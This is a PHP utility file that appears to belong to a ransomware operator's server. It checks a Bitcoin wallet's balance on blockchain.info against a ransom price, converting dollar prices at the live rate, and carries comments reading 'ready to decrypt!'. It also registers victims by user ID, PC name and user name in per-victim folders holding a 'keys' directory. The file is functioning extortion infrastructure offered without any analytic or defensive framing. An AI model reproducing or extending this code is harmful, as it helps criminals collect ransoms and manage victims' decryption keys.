<?php
	//////////////
	//// MISC ////
	//////////////
	
	$GLOBAL_NEXTCHECKBTCRATES = 0;
	$GLOBAL_BTCRATES = 0;

	function get_currency()
	{
		global $GLOBAL_NEXTCHECKBTCRATES, $GLOBAL_BTCRATES;
		
		$nextcheck1 = time();
		$nextcheck2 = $nextcheck1 + 900;
		
		if($nextcheck1 > $GLOBAL_NEXTCHECKBTCRATES)
		{
			//echo "\ntime elapsed, updating rates\n\n";
			
			$ch = curl_init();
			
			curl_setopt($ch, CURLOPT_URL, "https://blockchain.info/ticker");
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			
			$out = curl_exec($ch);
			
			curl_close($ch);
			
			$checkErr = json_decode($out, true);
			
			if(!empty($checkErr['USD']['last']))
			{
				$GLOBAL_NEXTCHECKBTCRATES = $nextcheck2;
				$GLOBAL_BTCRATES = $checkErr['USD']['last'];
			}
		}
		/*else
		{
			echo "\nnot checking rates\n\n";
		}*/

		return $GLOBAL_BTCRATES;
	}
	
	function check_wallet_balance($wallet, $price)
	{
		global $GLOBAL_BTCRATES;
		get_currency();
		
		if(!$GLOBAL_BTCRATES)
		{
			return false;
		}
		
		$ch = curl_init();
		
		curl_setopt($ch, CURLOPT_URL, "https://blockchain.info/balance?active=" . $wallet);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		
		$out = curl_exec($ch);
		
		curl_close($ch);
		
		$checkErr = json_decode($out, true);
		
		if(!empty($checkErr[$wallet]["final_balance"]))
		{
			$wallet_balance = formatBTC($checkErr[$wallet]["final_balance"]);
			if($price[0] == "$")
			{
				$in_btc = round(substr($price, 1, strlen($price) - 1) / $GLOBAL_BTCRATES, 6);
				if($wallet_balance >= $in_btc)
				{
					//echo "\nready to decrypt!\n\n";
					return true;
				}
			}
			else
			{
				if($wallet_balance >= $price)
				{
					//echo "\nready to decrypt!\n\n";
					return true;
				}
			}
		}
		
		return false;
	}
	
	function get_null_terminated_str_len($strchk)
	{
		$result = 0;
		$len = strlen($strchk);
		for($i = 0; $i < $len; $i++)
		{
			if($strchk[$i] == "\x00")
			{
				break;
			}
			$result++;
		}
		return $result;
	}
	
	// idk why i did this man
	// when im focused i dont think
	function sanitize_string($zestring)
	{
		$result = str_replace(".",  "#", $zestring);
		$result = str_replace("/",  "#", $result);
		$result = str_replace("\\", "#", $result);
		$result = str_replace("'",  "#", $result);
		$result = str_replace("\"", "#", $result);
		$result = str_replace("%",  "#", $result);
		$result = str_replace(";",  "#", $result);
		$result = str_replace("<",  "#", $result);
		$result = str_replace(">",  "#", $result);
		$result = str_replace("{",  "#", $result);
		$result = str_replace("}",  "#", $result);
		$result = str_replace("@",  "***", $result);
		$result = str_replace("?",  "#", $result);
		$result = str_replace("}",  "|", $result);
		return $result;
	}
	
	function check_user_info($user_id, $pc_name, $user_name)
	{
		$user_files = array_diff(scandir(USERINF_DATABASE), array('.', '..'));
		
		$is_found = false;
		foreach($user_files as $found_id)
		{
			if($user_id == $found_id)
			{
				$is_found = true;
				break;
			}
		}
		
		if($is_found)
		{
			$info_check = explode("@", file_get_contents(USERINF_DATABASE . $user_id . "/info"));
			
			if($info_check[0] != $pc_name) // sometimes username == SYSTEM
			{
				return null;
			}
			
			return USERINF_DATABASE . $user_id . "/";
		}
		
		mkdir(USERINF_DATABASE . $user_id, 0777);
		mkdir(USERINF_DATABASE . $user_id . "/keys", 0777);
		
		file_put_contents(USERINF_DATABASE . $user_id . "/info", $pc_name . "@" . $user_name);
		
		return USERINF_DATABASE . $user_id . "/";
	}
	
	function formatBTC($value)
	{
		$value = bcdiv(intval($value), 100000000, 8);
		$value = sprintf('%.8f', $value);
		return rtrim($value, '0');
	}
	
	function formatBytes($bytes, $precision = 2)
	{
		$units = array(' B', ' KB', ' MB', ' GB', ' TB'); 
		
		$bytes = max($bytes, 0); 
		$pow = floor(($bytes ? log($bytes) : 0) / log(1024)); 
		$pow = min($pow, count($units) - 1); 
		
		$bytes /= (1 << (10 * $pow));
		
		return round($bytes, $precision) . $units[$pow]; 
	}
?>